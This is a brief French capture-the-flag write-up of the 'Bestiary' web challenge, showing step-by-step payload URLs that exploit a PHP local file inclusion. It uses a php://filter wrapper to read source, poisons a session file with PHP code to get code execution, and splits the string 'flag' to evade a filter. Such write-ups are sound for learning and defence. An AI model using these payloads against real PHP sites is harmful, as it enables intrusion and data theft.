# Web - Bestiary

Faille LFI détectable avec l'ajout d'un `'` dans l'argument `monster`.

```
http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=php://filter/convert.base64-encode/resource=index.php
```
On recupere le contenu du fichier index.php grace au wrapper `php://`

On voit que le fichier de session est modifiable et accessible en lecture.

On voit que notre cookie de session est `PHPSESSIONID=97f1eeda9ea2d3a323571f9a9ee199aa;`,
donc notre fichier session est `sessions/sess_97f1eeda9ea2d3a323571f9a9ee199aa`.

On utilise le payload suivant pour lire le flag (sans contenir 'flag').

```php
<?php $suite='g.php'; include ('php://filter/convert.base64-encode/resource=fla'.$suite); ?>
```

On met à jour le fichier session
`http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=<?php $suite='g.php'; include ('php://filter/convert.base64-encode/resource=fla'.$suite); ?>sessions/sess_97f1eeda9ea2d3a323571f9a9ee199aa`

On l'execute
`http://challenges2.france-cybersecurity-challenge.fr:5004/index.php?monster=sessions/sess_97f1eeda9ea2d3a323571f9a9ee199aa`
